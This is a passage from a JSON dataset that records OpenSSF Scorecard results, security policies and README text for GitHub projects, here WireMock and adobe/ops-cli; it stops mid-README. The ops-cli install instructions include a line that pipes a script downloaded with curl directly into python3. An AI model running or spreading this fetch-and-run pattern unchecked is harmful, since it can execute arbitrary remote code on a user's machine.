                    "reason": "1 existing vulnerabilities detected",
                    "name": "Vulnerabilities",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#vulnerabilities",
                        "short": "Determines if the project has open, known unfixed vulnerabilities."
                    }
                }
            ],
            "metadata": null
        },
        "SecurityPolicy_url_endpoint": "https://api.github.com/repos/wiremock/.github/contents/SECURITY.md",
        "SecurityPolicy_content": "# Reporting security issues\n\nWe're extremely grateful to security researchers and users\nwho report vulnerabilities to WireMock and its ecosystem.\nAll reports are thoroughly investigated by maintainers of respective repositories.\n\n## When to report issues?\n\n- You think you discovered a potential security vulnerability in WireMock or its components\n- You are unsure how a publicly announced vulnerability in an upstream project affects WireMock,\n  and you suspect users might be impacted.\n- You think you discovered a new vulnerability in another project that WireMock depends on.\n  If so, make sure to report the issue to that project too by following their guidelines\n\nNote that security hardening enhancements are not considered vulnerabilities,\nand the common Request for Enhancement issue report should be used.\n\n## How to report an issue?\n\nMost of WireMock repositories use the _GitHub Security Advisory_ engine\nunder the _Security_ tab for issue reporting.\nUse it to submit the vulnerability reports,\nand only maintainers will be able to see and triage your reports.\nThey will contact you to negotiate the disclosure time and the next steps.\n\nIf you cannot use the GitHub reporting flow or if you didn't get a response within one week,\nyou can also email the private `conduct@wiremock.org` list with the security details and the details expected for the bug reports.\nIt is not the main intent of this channel, but the security issues will be routed too.\n\nFor upstream projects and WireMock components with their own vulnerability reporting and disclosure process,\nplease follow those processes.\n\n## Public Disclosure Timing\n\nA public disclosure date is negotiated by WireMock maintainers and the bug submitter.\nWe prefer to fully disclose the bug as soon as possible once a user mitigation is available in WireMock and in downstream projects and distributions.\nNote that it might take some time to coordinate releases and announcements \neven after the fix is available.\nThe WireMock maintainers will coordinate that.\n\nThe timeframe for disclosure is from immediate (especially if it's already publicly known) to a few months.\nWe intend to release fixes no later than 3 months according to the current independent security research practices.\nWe urge reporters to not disclose issues in public channels and social media before that.\n\n## Acknowledgements\n\nThis guide is inspired by the\n[Jenkins Security Policy](https://jenkins.io/security),\n[Kubernetes Security and Disclosure Information Guide](https://kubernetes.io/docs/reference/issues-security/security/),\nand the [InnerSource pattern on security](https://github.com/InnerSourceCommons/InnerSourcePatterns/blob/main/patterns/1-initial/balancing-openness-and-security.md).\n\n",
        "project_all_labels": [
            "as-designed",
            "breaking",
            "bug",
            "chore",
            "dependencies",
            "documentation",
            "duplicate",
            "enhancement",
            "extensibility",
            "good first issue",
            "hacktoberfest",
            "hacktoberfest-accepted",
            "help wanted",
            "invalid",
            "java",
            "javascript",
            "Maybe bug",
            "needs-tom",
            "ruby",
            "supportability"
        ],
        "README_content": "# WireMock - flexible and open source API mocking\n\n<p align=\"center\">\n    <a href=\"https://wiremock.org\" target=\"_blank\">\n        <img width=\"512px\" src=\"https://wiremock.org/images/logos/wiremock/logo_wide.svg\" alt=\"WireMock Logo\"/>\n    </a>\n</p>\n\n[![Build Status](https://github.com/tomakehurst/wiremock/actions/workflows/build-and-test.yml/badge.svg)](https://github.com/tomakehurst/wiremock/actions/workflows/build-and-test.yml)\n[![Docs](https://img.shields.io/static/v1?label=Documentation&message=public&color=green)](https://wiremock.org/docs/)\n[![a](https://img.shields.io/badge/slack-Join%20us-brightgreen?style=flat&logo=slack)](https://slack.wiremock.org/)\n[![Participate](https://img.shields.io/static/v1?label=Contributing&message=guide&color=orange)](./CONTRIBUTING.md)\n[![Maven Central](https://img.shields.io/maven-central/v/org.wiremock/wiremock.svg)](https://search.maven.org/artifact/org.wiremock/wiremock)\n\nWireMock is a popular open-source tool for API mock testing with over 5 million downloads per month.\nIt can help you to create stable test and development environments,\nisolate yourself from flakey 3rd parties and simulate APIs that don’t exist yet.\n\nStarted in 2011 as a Java library by [Tom Akehurst](https://github.com/tomakehurst),\nnow WireMock spans across multiple programming languages and technology stacks.\nIt can run as a library or client wrapper in many languages, or as a standalone server.\nThere is a big community behind the project and its ecosystem.\n\nWireMock supports several approaches for creating mock APIs -\nin code, via its REST API, as JSON files and by recording HTTP traffic proxied to another destination.\nWireMock has a rich matching system, allowing any part of an incoming request to be matched against complex and precise criteria.\nResponses of any complexity can be dynamically generated via the Handlebars based templating system.\nFinally, WireMock is easy to integrate into any workflow due to its numerous extension points and comprehensive APIs.\n\n## Key Features\n\nWireMock can run in unit tests, as a standalone process or a container.\nKey features include:\n\n- HTTP response stubbing, matchable on URL, header and body content patterns\n- Configuration via a fluent Java API, JSON files and JSON over HTTP\n- Record/playback of stubs\n- Request verification\n- Fault and response delays injection\n- Per-request conditional proxying\n- Browser proxying for request inspection and replacement\n- Stateful behaviour simulation\n- Extensibility\n\nFull documentation can be found at [wiremock.org/docs](https://wiremock.org/docs).\n\n## Questions and Issues\n\nIf you have a question about WireMock, or are experiencing a problem you're not sure is a bug please post a message to the\n[WireMock Community Slack](https://slack.wiremock.org) in the `#help` channel.\n\nOn the other hand if you're pretty certain you've found a bug please open an issue.\n\n## Log4j Notice\n\nWireMock only uses log4j in its test dependencies. Neither the thin nor standalone JAR depends on or embeds log4j, so\nyou can continue to use WireMock 2.32.0 and above without any risk of exposure to the recently discovered vulnerability.\n\n## Contributing\n\nWireMock exists and continues to thrive due to the efforts of contributors.\nRegardless of your expertise and time you could dedicate,\nthere're opportunities to participate and help the project!\n\nSee the [Contributing Guide](./CONTRIBUTING.md) for more information.\n",
        "num_commits": 3572,
        "project_age_days": 4769,
        "project_created_at": "2011-10-09",
        "latest_updated_at": "2024-10-29",
        "latest_pushed_at": "2024-10-29",
        "num_contributors": 222,
        "num_pull": 1389,
        "num_issues": 2877,
        "num_opening_issue": 427,
        "project_size(kB)": 46745,
        "num_stargazers": 6352,
        "num_watchers": 6352,
        "num_forks": 1431,
        "num_subscribers": 139,
        "SecurityPolicy_created_at": "2023-04-19 07:40:35",
        "SecurityPolicy_commit_history": [
            {
                "commit_id": "0cf5affdf298f9d26f974e4a2298f1dd8ae2ab25",
                "url": "https://github.com/wiremock/.github/commit/0cf5affdf298f9d26f974e4a2298f1dd8ae2ab25",
                "date": "2023-04-19 11:03:12"
            },
            {
                "commit_id": "d0d17b71482e09f6a7a77eb109b7c883d34ec134",
                "url": "https://github.com/wiremock/.github/commit/d0d17b71482e09f6a7a77eb109b7c883d34ec134",
                "date": "2023-04-19 07:40:35"
            }
        ],
        "project_security_labels": [],
        "security_issues": [],
        "SecurityPolicy_reporting_mechanism": "email",
        "num_security_issues_after_policy": 0,
        "num_security_issue_and_pull": 0,
        "security_issues_created_after_policy": [],
        "SecurityPolicy_content_category": [
            "Projects practice",
            "Reporting mechanism",
            "Reporting mechanism",
            "Projects practice",
            "Additional information"
        ],
        "num_noncompliant_security_discuss_issue": 0,
        "num_noncompliant_security_pull": 0,
        "has_generic_policy": false
    },
    {
        "project_name": "adobe/ops-cli",
        "project_url": "https://github.com/adobe/ops-cli",
        "SSF": {
            "date": "2024-10-29T19:50:40+07:00",
            "repo": {
                "name": "github.com/adobe/ops-cli",
                "commit": "60d3aa8d9926b5b7f329d5d181373eb8eb7ac22b"
            },
            "scorecard": {
                "version": "5.0.0",
                "commit": "ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4"
            },
            "score": 5.4,
            "checks": [
                {
                    "details": null,
                    "score": 10,
                    "reason": "no binaries found in the repo",
                    "name": "Binary-Artifacts",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#binary-artifacts",
                        "short": "Determines if the project has generated executable (binary) artifacts in the source repository."
                    }
                },
                {
                    "details": [
                        "Warn: branch protection not enabled for branch 'master'"
                    ],
                    "score": 0,
                    "reason": "branch protection not enabled on development/release branches",
                    "name": "Branch-Protection",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#branch-protection",
                        "short": "Determines if the default and release branches are protected with GitHub's branch protection settings."
                    }
                },
                {
                    "details": null,
                    "score": 3,
                    "reason": "10 out of 27 merged PRs checked by a CI test -- score normalized to 3",
                    "name": "CI-Tests",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#ci-tests",
                        "short": "Determines if the project runs tests before pull requests are merged."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "no effort to earn an OpenSSF best practices badge detected",
                    "name": "CII-Best-Practices",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#cii-best-practices",
                        "short": "Determines if the project has an OpenSSF (formerly CII) Best Practices Badge."
                    }
                },
                {
                    "details": null,
                    "score": 5,
                    "reason": "Found 4/7 approved changesets -- score normalized to 5",
                    "name": "Code-Review",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#code-review",
                        "short": "Determines if the project requires human code review before pull requests (aka merge requests) are merged."
                    }
                },
                {
                    "details": [
                        "Info: adobe contributor org/company found, "
                    ],
                    "score": 3,
                    "reason": "project has 1 contributing companies or organizations -- score normalized to 3",
                    "name": "Contributors",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#contributors",
                        "short": "Determines if the project has a set of contributors from multiple organizations (e.g., companies)."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "no dangerous workflow patterns detected",
                    "name": "Dangerous-Workflow",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dangerous-workflow",
                        "short": "Determines if the project's GitHub Action workflows avoid dangerous patterns."
                    }
                },
                {
                    "details": [
                        "Info: detected update tool: RenovateBot: renovate.json:1"
                    ],
                    "score": 10,
                    "reason": "update tool detected",
                    "name": "Dependency-Update-Tool",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dependency-update-tool",
                        "short": "Determines if the project uses a dependency update tool."
                    }
                },
                {
                    "details": [
                        "Warn: no fuzzer integrations found"
                    ],
                    "score": 0,
                    "reason": "project is not fuzzed",
                    "name": "Fuzzing",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#fuzzing",
                        "short": "Determines if the project uses fuzzing."
                    }
                },
                {
                    "details": [
                        "Info: project has a license file: LICENSE:0",
                        "Info: FSF or OSI recognized license: Apache License 2.0: LICENSE:0"
                    ],
                    "score": 10,
                    "reason": "license file detected",
                    "name": "License",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#license",
                        "short": "Determines if the project has defined a license."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "0 commit(s) and 0 issue activity found in the last 90 days -- score normalized to 0",
                    "name": "Maintained",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#maintained",
                        "short": "Determines if the project is \"actively maintained\"."
                    }
                },
                {
                    "details": [
                        "Info: Project packages its releases by way of GitHub Actions.: .github/workflows/release.yml:22"
                    ],
                    "score": 10,
                    "reason": "packaging workflow detected",
                    "name": "Packaging",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#packaging",
                        "short": "Determines if the project is published as a package that others can easily download, install, easily update, and uninstall."
                    }
                },
                {
                    "details": [
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql-analysis.yml:42: update your workflow using https://app.stepsecurity.io/secureworkflow/adobe/ops-cli/codeql-analysis.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql-analysis.yml:46: update your workflow using https://app.stepsecurity.io/secureworkflow/adobe/ops-cli/codeql-analysis.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql-analysis.yml:57: update your workflow using https://app.stepsecurity.io/secureworkflow/adobe/ops-cli/codeql-analysis.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql-analysis.yml:71: update your workflow using https://app.stepsecurity.io/secureworkflow/adobe/ops-cli/codeql-analysis.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release.yml:27: update your workflow using https://app.stepsecurity.io/secureworkflow/adobe/ops-cli/release.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release.yml:29: update your workflow using https://app.stepsecurity.io/secureworkflow/adobe/ops-cli/release.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release.yml:55: update your workflow using https://app.stepsecurity.io/secureworkflow/adobe/ops-cli/release.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/release.yml:60: update your workflow using https://app.stepsecurity.io/secureworkflow/adobe/ops-cli/release.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/release.yml:70: update your workflow using https://app.stepsecurity.io/secureworkflow/adobe/ops-cli/release.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/release.yml:77: update your workflow using https://app.stepsecurity.io/secureworkflow/adobe/ops-cli/release.yml/master?enable=pin",
                        "Warn: containerImage not pinned by hash: Dockerfile:1",
                        "Warn: containerImage not pinned by hash: Dockerfile:26: pin your Docker image by updating python:3.11.4-alpine3.18 to python:3.11.4-alpine3.18@sha256:603975e62d85aa07578034d3d10ffa1983b7618a6abb6371cf51941be6b8842c",
                        "Warn: pipCommand not pinned by hash: Dockerfile:14-19",
                        "Warn: pipCommand not pinned by hash: Dockerfile:38-64",
                        "Warn: pipCommand not pinned by hash: build_scripts/freeze_requirements.sh:5",
                        "Warn: pipCommand not pinned by hash: build_scripts/run_tests.sh:8",
                        "Warn: pipCommand not pinned by hash: build_scripts/run_tests.sh:9",
                        "Warn: pipCommand not pinned by hash: build_scripts/run_tests.sh:11",
                        "Warn: pipCommand not pinned by hash: .github/workflows/release.yml:34",
                        "Warn: pipCommand not pinned by hash: .github/workflows/release.yml:35",
                        "Warn: pipCommand not pinned by hash: .github/workflows/release.yml:42",
                        "Info:   0 out of   7 GitHub-owned GitHubAction dependencies pinned",
                        "Info:   1 out of   4 third-party GitHubAction dependencies pinned",
                        "Info:   0 out of   9 pipCommand dependencies pinned",
                        "Info:   0 out of   2 containerImage dependencies pinned"
                    ],
                    "score": 0,
                    "reason": "dependency not pinned by hash detected -- score normalized to 0",
                    "name": "Pinned-Dependencies",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#pinned-dependencies",
                        "short": "Determines if the project has declared and pinned the dependencies of its build process."
                    }
                },
                {
                    "details": [
                        "Info: SAST configuration detected: CodeQL",
                        "Warn: 10 commits out of 27 are checked with a SAST tool"
                    ],
                    "score": 7,
                    "reason": "SAST tool detected but not run on all commits",
                    "name": "SAST",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#sast",
                        "short": "Determines if the project uses static code analysis."
                    }
                },
                {
                    "details": [
                        "Info: security policy file detected: github.com/adobe/.github/.github/SECURITY.md:1",
                        "Info: Found linked content: github.com/adobe/.github/.github/SECURITY.md:1",
                        "Info: Found disclosure, vulnerability, and/or timelines in security policy: github.com/adobe/.github/.github/SECURITY.md:1",
                        "Info: Found text in security policy: github.com/adobe/.github/.github/SECURITY.md:1"
                    ],
                    "score": 10,
                    "reason": "security policy file detected",
                    "name": "Security-Policy",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#security-policy",
                        "short": "Determines if the project has published a security policy."
                    }
                },
                {
                    "details": null,
                    "score": -1,
                    "reason": "no releases found",
                    "name": "Signed-Releases",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#signed-releases",
                        "short": "Determines if the project cryptographically signs release artifacts."
                    }
                },
                {
                    "details": [
                        "Info: jobLevel 'contents' permission set to 'read': .github/workflows/codeql-analysis.yml:29",
                        "Info: jobLevel 'actions' permission set to 'read': .github/workflows/codeql-analysis.yml:28",
                        "Info: jobLevel 'contents' permission set to 'read': .github/workflows/release.yml:51",
                        "Warn: no topLevel permission defined: .github/workflows/codeql-analysis.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/release.yml:1",
                        "Info: no jobLevel write permissions found"
                    ],
                    "score": 0,
                    "reason": "detected GitHub workflow tokens with excessive permissions",
                    "name": "Token-Permissions",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#token-permissions",
                        "short": "Determines if the project's workflows follow the principle of least privilege."
                    }
                },
                {
                    "details": [
                        "Warn: Project is vulnerable to: GHSA-h5c8-rqwp-cp95",
                        "Warn: Project is vulnerable to: GHSA-h75v-3vvj-5mfj"
                    ],
                    "score": 8,
                    "reason": "2 existing vulnerabilities detected",
                    "name": "Vulnerabilities",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#vulnerabilities",
                        "short": "Determines if the project has open, known unfixed vulnerabilities."
                    }
                }
            ],
            "metadata": null
        },
        "SecurityPolicy_url_endpoint": "https://api.github.com/repos/adobe/.github/contents/.github/SECURITY.md",
        "SecurityPolicy_content": "# Security Policies and Procedures\n\n## Reporting an Issue\n\nIf you need to report a security issue please visit [Notifying Adobe of Security Issues](https://helpx.adobe.com/ca/security/alertus.html)\n\n## Disclosure Policy\n\nFor more information on our disclosure policy please visit [Vulnerability Disclosure Program Policy](https://helpx.adobe.com/security/policy.html)\n",
        "project_all_labels": [
            "bug",
            "dependencies",
            "duplicate",
            "enhancement",
            "good first issue",
            "help wanted",
            "invalid",
            "question",
            "wontfix"
        ],
        "README_content": "# Ops CLI\n[![Build status](https://github.com/adobe/ops-cli/actions/workflows/release.yml/badge.svg)](https://github.com/adobe/ops-cli/actions/workflows/release.yml) [![Docker image](https://img.shields.io/badge/Docker-ghcr.io/adobe/opscli-brightgreen.svg?style=flat-square)](https://github.com/adobe/ops-cli/pkgs/container/ops-cli) [![License](https://img.shields.io/github/license/adobe/ops-cli)](https://github.com/adobe/ops-cli/blob/master/LICENSE)\n\n**From version 2.0 onward, `ops-cli` requires Python3.  \nIf you're still using Python2, use `ops-cli` version <2.0**\n\n**ops-cli** is a python wrapper for [Terraform](https://www.terraform.io/), [Ansible](https://www.ansible.com/) and SSH for cloud automation. \n\nWe use multiple tools to manage our infrastructure at Adobe. The purpose of `ops-cli` is to gather the common cluster configurations in a single place and, based on these, interact with the above mentioned tools. In this way, we can avoid duplication and can quickly spin up new clusters (either production or development ones). All we need to do is customize the cluster configuration file ([example here](https://github.com/adobe/ops-cli/blob/master/examples/aws-kubernetes/clusters/my-kubernetes-cluster.yaml)).\n\n`ops-cli` integrates with the Azure and AWS cli, in order to provide inventory, ssh, sync, tunnel and the possibility to run ansible playbooks on a fleet of EC2 instances.\nIt can be used to add a layer of templating (using jinja2) on top of Terraform files. This is useful for removing duplicated code when it comes to spinning up infrastructure across multiple environments (stage/sandbox/prod) and across teams. Useful for both AWS and [Kubernetes deployments](https://github.com/adobe/ops-cli/tree/master/examples/aws-kubernetes).\n\n# Table of Contents\n\n<!--ts-->\n   * [How it works?](#how-it-works)\n   * [Use cases](#use-cases)\n      * [Manage AWS EC2 instances](#manage-aws-ec2-instances)\n      * [Terraform](#terraform)\n      * [Run terraform by using hierarchical configs](#run-terraform-by-using-hierarchical-configs)\n      * [Create Kubernetes cluster (using AWS EKS)](#create-kubernetes-cluster-using-aws-eks)\n   * [Installing](#installing)\n      * [Local](#local)\n         * [Virtualenv](#virtualenv)\n         * [Ops tool installation](#ops-tool-installation)\n            * [Python 3](#python-3)\n         * [Terraform](#terraform-1)\n      * [Using docker image](#using-docker-image)\n      * [Configuring](#configuring)\n         * [AWS](#aws)\n         * [Azure](#azure)\n      * [Examples](#examples)\n      * [Usage help](#usage-help)\n      * [More help](#more-help)\n      * [Tool configuration: .opsconfig.yaml](#tool-configuration-opsconfigyaml)\n         * [Inventory](#inventory)\n            * [AWS example](#aws-example)\n            * [Azure example](#azure-example)\n            * [Inventory usage](#inventory-usage)\n         * [Terraform](#terraform-2)\n            * [Terraform landscape](#terraform-landscape)\n         * [SSH](#ssh)\n            * [SSHPass](#sshpass)\n            * [Balabit SCB](#scb)\n         * [Play](#play)\n         * [Run command](#run-command)\n         * [Sync files](#sync-files)\n         * [Noop](#noop)\n         * [Packer](#packer)\n      * [Secrets Management](#secrets-management)\n         * [Vault](#vault)\n         * [Amazon Secrets Manager (SSM)](#amazon-secrets-manager-ssm)\n      * [Using jinja2 filters in playbooks and terraform templates](#using-jinja2-filters-in-playbooks-and-terraform-templates)\n      * [SKMS](#skms)\n   * [Development](#development)\n      * [Install ops in development mode](#install-ops-in-development-mode)\n      * [Running tests](#running-tests)\n   * [Troubleshooting](#troubleshooting)\n   * [License](#license)\n\n<!-- Added by: amuraru, at: Tue Nov 12 10:23:17 EET 2019 -->\n\n<!--te-->\n\n# How it works?\n\nYou define a cluster configuration, using a yaml file. The yaml file contains different kind of sections, one for each plugin. For instance, you could have a section for Terraform files, a section for AWS instructions, Kubernetes Helm charts and so forth.\n\n# Use cases\n\n## Manage AWS EC2 instances\n\nOnce you define your cluster configuration, you can run `ops` commands such as seeing the instance inventory.\n```sh\n# fetch instances from AWS and prints them\nops clusters/mycluster.yaml inventory --limit webapp \n```\n\nThis would output something like:\n![ops](https://user-images.githubusercontent.com/952836/52021401-9f553c80-24fd-11e9-802c-155f5a0e7f63.png)\n\nThen you can run `ssh`, `play`, `run`, `sync` etc.\n\n```sh\n# SSH to one of the nodes (can handle bastion as well)\nops clusters/mycluster.yaml ssh webapp-01\n\n# run a deployment playbook via ansible\nops clusters/mycluster.yaml play ansible/playbooks/task/webapp/deployment.yaml -- -e version=5.36.2 -u ec2-user --limit webapp\n\n# run command on all selected nodes\nops clusters/mycluster.yaml run \"sudo yum upgrade myawesomeapp; sudo service myawesomeapp restart\" -- -u ec2-user --limit '\"aam_app_group=canary;az=us-east-1a\"'\n\n# copy file to all servers\nops clusters/mycluster.yaml sync /tmp/myfile webapp: -l ec2-user\n\n# create a tunnel\nops clusters/stage.yaml ssh --tunnel --local 8080 --remote 8080 stage-thanos-1 -l ec2-user\n```\n\nSee [examples/features/inventory](https://github.com/adobe/ops-cli/tree/master/examples/features/inventory)\n\n## Terraform\n\n```sh\n# Performs jinja templating (if any) and runs terraform plan\nops clusters/mycluster.yaml terraform --path-name aws-eks plan\n\n# Run terraform apply, with the possibility to sync the tf state files remotely (currently, AWS S3 bucket is supported + DynamoDB for locking). \nops clusters/mycluster.yaml terraform --path-name aws-eks apply\n```\n\n![ops-terraform](https://user-images.githubusercontent.com/952836/52021396-9bc1b580-24fd-11e9-9da8-00fb68bd5c72.png)\n\n## Run terraform by using hierarchical configs\n\nSee [examples/features/terraform-hierarchical](https://github.com/adobe/ops-cli/tree/master/examples/features/terraform-hierarchical)\n\n## Create Kubernetes cluster (using AWS EKS)\n\nSee [examples/aws-kubernetes](https://github.com/adobe/ops-cli/tree/master/examples/aws-kubernetes)\n\n# Installing\n\n## Local\n\n### Virtualenv\nHere is a link about how to install and use virtualenv: \nhttps://virtualenv.pypa.io/en/stable/\n\n### Ops tool installation\n\n#### Python 3\n```sh\n# Make sure pip is up to date\ncurl https://bootstrap.pypa.io/get-pip.py | python3\n\n# Install virtualenv\npip install --upgrade virtualenv\npip install --upgrade virtualenvwrapper\n\necho 'export WORKON_HOME=$HOME/.virtualenvs' >> ~/.bash_profile\necho 'source /usr/local/bin/virtualenvwrapper.sh' >> ~/.bash_profile\nsource ~/.bash_profile\n\n# create virtualenv\nmkvirtualenv ops\nworkon ops\n\n# uninstall previous `ops` version (if you have it)\npip uninstall ops --yes\n\n# install ops-cli v2.2.1 stable release\npip install --upgrade ops-cli\n```\n\n\n### Terraform\nOptionally, install terraform to be able to access terraform plugin. See https://www.terraform.io/intro/getting-started/install.html\nAlso for pretty formatting of terraform plan output you can install https://github.com/coinbase/terraform-landscape (use gem install for MacOS)\n\n\n## Using docker image\n\nYou can try out `ops-cli`, by using docker. The docker image has all required prerequisites (python, terraform, helm, git, ops-cli etc).\n\nTo start out a container, running the latest `ops-cli` docker image run:\n```sh\ndocker run -it ghcr.io/adobe/ops-cli:2.2.1 bash\n```\n\nAfter the container has started, you can start using `ops-cli`:\n```sh\nops help\n# usage: ops [-h] [--root-dir ROOT_DIR] [--verbose] [-e EXTRA_VARS]\n#           cluster_config_path\n#           {inventory,terraform,packer,ssh,play,run,sync,noop} ...\n\ngit clone https://github.com/adobe/ops-cli.git\ncd ops-cli\nls examples\n# aws-kubernetes\n# cassandra-stress\n# features\n\ncd examples/aws-kubernetes\nops clusters/my-kubernetes-cluster.yaml terraform --path-name aws-eks plan\n# in order to setup aws-kubernetes follow the steps from https://github.com/adobe/ops-cli/blob/master/examples/aws-kubernetes/README.md\n```\n\n\n## Configuring\n\n### AWS\nIf you plan to use ops with AWS, you must configure credentials for each account\n```shell\n$ aws configure --profile aws_account_name\n```\n\n### Azure\nTBD\n\n## Examples\n\nSee [examples/](https://github.com/adobe/ops-cli/tree/master/examples) folder:\n- cassandra-stress - n-node cassandra cluster used for stress-testing; a basic stress profile is included\n- spin up a Kubernetes cluster\n- distinct `ops` features\n\n## Usage help\nTo see all commands and a short description run `ops --help`\n```\nusage: ops [-h] [--root-dir ROOT_DIR] [--verbose] [-e EXTRA_VARS]\n           cluster_config_path\n           {inventory,terraform,packer,ssh,play,run,sync,noop} ...\n\nRun commands against a cluster definition\n\npositional arguments:\n  cluster_config_path   The cluster config path cluster.yaml\n  {inventory,terraform,packer,ssh,play,run,sync,noop}\n    inventory           Show current inventory data\n    terraform           Wrap common terraform tasks with full templated\n                        configuration support\n    packer              Wrap common packer tasks and inject variables from a\n                        cluster file\n    ssh                 SSH or create an SSH tunnel to a server in the cluster\n    play                Run an Ansible playbook\n    run                 Runs a command against hosts in the cluster\n    sync                Sync files from/to a cluster\n    noop                used to initialize the full container for api usage\n\noptional arguments:\n  -h, --help            show this help message and exit\n  --root-dir ROOT_DIR   The root of the resource tree - it can be an absolute\n                        path or relative to the current dir\n  --verbose, -v         Get more verbose output from commands\n  -e EXTRA_VARS, --extra-vars EXTRA_VARS\n                        Extra variables to use. Eg: -e ssh_user=ssh_user\n```\n\n## More help\n\nEach sub-command includes additional help information that you can get by running:\n`ops examples/inventory/aam.yaml sync --help`\n\n## Tool configuration: .opsconfig.yaml\n\nSome tool settings are available via a [.opsconfig.yaml](https://github.com/adobe/ops/blob/master/src/ops/opsconfig.py) configuration file.\nThe file is looked-up in `/etc/opswrapper/.opsconfig.yaml`, then in `~/.opsconfig.yaml` and then in the project folder starting from the current dir and up to the root dir.\nAll the files found this way are merged together so that you can set some global defaults, then project defaults in the root dir of the project and\noverwrite them for individual envs. Eg: `~/.opsconfig.yaml`, `/project/.opsconfig.yaml`, `/project/clusters/dev/.opsconfig.yaml`\n\n### Inventory\n\nThe `inventory` command will list all the servers in a given cluster and cache the results for further operations on them (for instance, SSHing to a given node or running an ansible playbook).\n\nYou can always filter which nodes you want to display or use to run an ansible playbook on, by using the `--limit` argument (eg. `--limit webapp`). The extra filter is applied on the instance tags, which includes the instance name.\n\nThe way `inventory` works is by doing a describe command in AWS/Azure. The describe command matches all the nodes that have the tag \"cluster\" equal to the cluster name you have defined.\n\nIn order to configure it, you need to add the `inventory` section in your cluster configuration file ([example here](https://github.com/adobe/ops-cli/blob/master/examples/features/inventory/my-aws-cluster.yaml)).\n\n#### AWS example\n```\n---\ninventory:\n  - plugin: cns\n    args:\n      clusters:\n        - region: us-east-1\n          boto_profile: aam-npe # make sure you have this profile in your ~/.aws/credentials file\n          names: [mycluster1] # this assumes the EC2 nodes have the Tag Name \"cluster\" with Value \"mycluster1\"\n```\n\n#### Azure example\n```\n---\ninventory:\n  - plugin: azr\n    args:\n      tags: environment=prod\n      locations: westeurope,northeurope\n```\n\n#### Inventory usage\n```\nusage: ops cluster_config_path inventory [-h] [-e EXTRA_VARS]\n                                         [--refresh-cache] [--limit LIMIT]\n                                         [--facts]\n\noptional arguments:\n  -h, --help            show this help message and exit\n  -e EXTRA_VARS, --extra-vars EXTRA_VARS\n                        Extra variables to use. Eg: -e ssh_user=ssh_user\n  --refresh-cache       Refresh the cache for the inventory\n  --limit LIMIT         Limit run to a specific server subgroup. Eg: --limit\n                        newton-dcs\n  --facts               Show inventory facts for the given hosts\n```\n\n### Terraform\n```\nusage: ops cluster_config_path terraform [-h] [--var VAR] [--module MODULE]\n                                         [--resource RESOURCE] [--name NAME]\n                                         [--plan]\n                                         subcommand\n\npositional arguments:\n  subcommand           apply | console | destroy | import | output | plan |\n                       refresh | show | taint | template | untaint\n\noptional arguments:\n  -h, --help            show this help message and exit\n  --var VAR             the output var to show\n  --module MODULE       for use with \"taint\", 